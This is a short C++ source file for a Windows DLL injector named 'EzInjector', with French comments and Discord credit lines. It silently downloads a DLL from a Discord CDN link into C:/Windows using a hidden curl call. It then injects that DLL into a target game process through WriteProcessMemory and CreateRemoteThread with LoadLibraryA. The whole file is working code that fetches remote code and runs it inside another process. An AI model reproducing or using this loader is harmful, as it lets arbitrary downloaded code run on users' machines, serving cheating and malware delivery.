#include "auth.h"
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "Console.h"
#define UNLEN 64

using namespace std;
namespace con = JadedHoboConsole;

//// By InkaWeb and documentation on forum //////
// Github : https://github.com/Student-MasterDev //
// Discord : https://discord.gg/zrdFGSa7rz       //
///////////////////////////////////////////////////

DWORD GetProcId(const char* procName)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				if (!_stricmp(procEntry.szExeFile, procName))
				{
					procId = procEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
	return procId;
}

int main(int argc, const char* argv[]) {
	SetConsoleTitleA("EzInjector | By InkaWeb#6666 | Discord : https://discord.gg/eBNkgWWzSt");
	system("clear");

	// --> system("curl {Link Download} --output {Chemin du download de la DLL} >nul 2>&1"); <--

	system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/exempledll.dll --output C:/Windows/exemple.dll >nul 2>&1");
	cout << "[" << con::fg_green << "/" << con::fg_white << "] Please press ENTER to " << con::fg_green << "inject " << con::fg_white << "!" << endl;
	std::cout << "\n";

	// dllPath : Chemin de la DLL qui a été defini dans le --> system("curl {Link Download} --output {Chemin de la DLL}..."); <--
	// procName : Nom du processus qui va recevoir la DLL

	const char* dllPath = "C:\\Windows\\exemple.dll";
	const char* procName = "GameExemple.exe";
	DWORD procId = 0;

	while (!procId)
	{
		procId = GetProcId(procName);
		Sleep(30);
	}

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

	if (hProc && hProc != INVALID_HANDLE_VALUE)
	{
		void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

		HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

		if (hThread)
		{
			CloseHandle(hThread);
		}
	}

	if (hProc)
	{
		CloseHandle(hProc);
	}
	return 0;
}

//// By MasterDev and documentation on forum //////
// Github : https://github.com/Student-MasterDev //
// Discord : https://discord.gg/zrdFGSa7rz       //
///////////////////////////////////////////////////
